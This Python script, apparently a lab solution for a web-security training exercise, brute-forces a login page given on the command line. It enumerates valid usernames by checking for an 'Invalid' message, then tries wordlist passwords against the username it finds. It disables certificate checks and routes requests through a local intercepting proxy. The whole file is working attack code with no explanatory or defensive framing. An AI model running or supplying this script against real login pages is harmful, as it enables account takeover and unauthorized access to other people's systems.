import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {"http":"https://127.0.0.1:8080","https":"https://127.0.0.1:8080"}

def blogin(url):
    path = "login"
    with open('auth-usernames','r') as fusernames, open('auth-passwords','r') as fpasswords:
        usernames = fusernames.readlines()
        passwords = fpasswords.readlines()

        for u in usernames:
            u = u.strip('\n')
            params = {'username':u,'password':'p'}
            r = requests.post(url + path, data = params, verify=False, proxies=proxies)
            if "Invalid" not in r.text:
                print ('[+] USERNAME: %s ' %(u))
                break
        
        for p in passwords:
            p = p.strip('\n')
            params = {'username':u,'password':p}
            r = requests.post(url + path, data = params, verify=False, proxies=proxies)
            if "Incorrect" not in r.text:
                print ('[+] PASSWORD: %s ' %(p))
                break
                

def main():
    if len(sys.argv) != 2:
        print ("(+) Usage: %s <url> " % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print ("(+) Brute-Forcing login page")
    blogin(url)

if __name__ == "__main__":
    main()